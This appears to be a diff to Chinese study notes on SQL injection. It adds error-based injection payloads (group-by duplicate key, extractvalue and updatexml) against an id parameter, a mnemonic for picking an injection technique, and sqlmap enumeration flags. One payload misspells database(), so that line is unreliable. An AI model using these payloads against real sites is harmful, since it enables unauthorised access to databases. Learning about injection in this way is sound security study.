@@ -185,4 +185,38 @@ select ~~~ union select ~~~
 
   十六进制解码
 
-  
+  ## 报错注入
+
+  在注入点的判断过程中，发现数据库中SQL语句的报错信息，会显示在页面中，因此可以进行报错注入。
+
+  报错注入的原理，就是在错误信息中执行SQL语句。触发报错的方式很多，具体细节也不尽相同
+
+  - group by 重复键冲突
+
+  [?id=33 and (select 1 from (select count(*),concat((select version() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+]
+
+  - XPATH 报错
+
+  @ extractvalue()
+  [?id=33 and extractvalue(1,concat('^',(select version()),'^')) --+]
+
+  @ updatexml()
+  [?id=33 and updatexml(1,concat('^',(select datebase()),'^'),1) --+]
+
+```
+ 口诀
+ 是否有回显    联合查询
+ 是否有报错    报错注入
+ 是否有布尔类型状态  布尔盲注
+ 绝招          延时注入
+```
+
+# sqlmap 
+
+-u url   检测注入点
+--dbs    列出所有数据库的名字
+--current-db   列出当前数据库的名字
+-D       指定一个数据库
+--tables  列出表名
+-T       指定表名
+--columns  列出所有的字段名
